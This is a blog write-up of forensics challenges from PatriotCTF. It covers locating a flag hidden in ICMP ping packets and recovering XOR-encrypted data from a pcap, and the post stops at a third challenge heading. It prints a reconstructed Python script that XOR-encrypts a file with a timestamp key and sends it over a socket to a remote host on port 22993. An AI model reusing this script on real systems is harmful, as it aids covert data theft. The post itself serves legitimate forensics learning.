---
layout: post
title:  Patriot CTFs
tags: [Forensics]
date:   2024-08-12 00:00:00
excerpt: "Patriot CTFs"
feature: https://raw.githubusercontent.com/raviyelna/raviyelna.github.io/master/assets/img/background.jpg
categories: CTFs
---
# PatriotCTFs
## Solved by Raviel 
### Forensics
#### SimpleExfiltration

![]({{site.url}}/Writeup_images/PCTF/Simple Exfiltration/SimpleExfiltration.png)

The Challenge say something about Exfiltration so I will be looking for the most suspicious conversation
as you can see here the total of bytes tranfered betweetn ip.addr==192.168.237.132 && ip.addr==192.168.237.1 is kinda large, so let filter them out first
![]({{site.url}}/Writeup_images/PCTF/Simple Exfiltration/image.png)
after checking out the whole conversation between these two I found nothing suspicious with HTTP, TCP but I knowticed that there a lot of ping between them so I filter them out
And guess what They hid the flag inside these packet.
![]({{site.url}}/Writeup_images/PCTF/Simple Exfiltration/image copy.png)
Look through all these IMCP packet you will get the flag
pctf{time_to_live_exfiltration}
---
#### Slingshot
![]({{site.url}}/Writeup_images/PCTF/Slingshot/Slingshot.png)

The challenge gave us a pcapng file open it up immediately check the export object, you can see there a pyc file name download, FYI PYC is an compiled Python Script so you have to find some decompiler such [this](https://github.com/zrax/pycdc)

![]({{site.url}}/Writeup_images/PCTF/Slingshot/image1.png)

(do it by yourself, I'm to lazy to do it again so here the source code of that Python that I reconstructed)
```py
import sys
import socket
import time
import math

# Create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Command-line arguments
file = sys.argv[1]  # file path
ip = sys.argv[2]    # IP address
port = 22993        # fixed port

# Open the file in binary mode and read its contents
with open(file, 'rb') as r:
    data_bytes = r.read()

# Generate a key from the current time
current_time = math.floor(time.time())
key_bytes = str(current_time).encode('utf-8')

# Adjust key length to match the data length
init_key_len = len(key_bytes)
data_bytes_len = len(data_bytes)
temp1 = data_bytes_len // init_key_len
temp2 = data_bytes_len % init_key_len
key_bytes *= temp1
key_bytes += key_bytes[:temp2]

# XOR encryption
encrypt_bytes = bytes(a ^ b for a, b in zip(key_bytes, data_bytes))

# Connect to the server and send the encrypted data
s.connect((ip, port))
s.send(encrypt_bytes)

# Close the socket
s.close()
```
So you can see, its encrypt a file with the current stamptime then send it through port 22993, okay so what do we need to do now?

As we far we have known that it encrypted a file then send through port 22993, we can know filter the port 22993 to get the file back: 

![]({{site.url}}/Writeup_images/PCTF/Slingshot/image2.png)

This look like a file that got sent and we also have the timestamp from wireshark **You should check the author or CTFs event tiemezone before decrypting the file because I myself have been using my timezone until one of my teammate Quanda found the correct timestamp of it**

![]({{site.url}}/Writeup_images/PCTF/Slingshot/image3.png)

with that I used this script and got the Flag from an image

```py
import sys
import socket
import time
import math
import binascii

timestamp = 1726595769 

# Read the encrypted data from enc.txt
with open('enc.txt', 'r') as file:
    encrypted_hex_string = file.read().strip()

# Remove spaces/newlines and decode from hex
encrypted_data = binascii.unhexlify(encrypted_hex_string.replace('\n', ''))


key_bytes = str(timestamp).encode('utf-8')


init_key_len = len(key_bytes)
encrypted_data_len = len(encrypted_data)
temp1 = encrypted_data_len // init_key_len
temp2 = encrypted_data_len % init_key_len
key_bytes *= temp1
key_bytes += key_bytes[:temp2]

# XOR decryption
data_bytes = bytes(a ^ b for a, b in zip(key_bytes, encrypted_data))


with open('decrypted_file.bin', 'wb') as w:
    w.write(data_bytes)
```

![]({{site.url}}/Writeup_images/PCTF/Slingshot/image4.png)

---
#### Secret Note
![]({{site.url}}/Writeup_images/PCTF/Secret_Note/Secret_Note.png)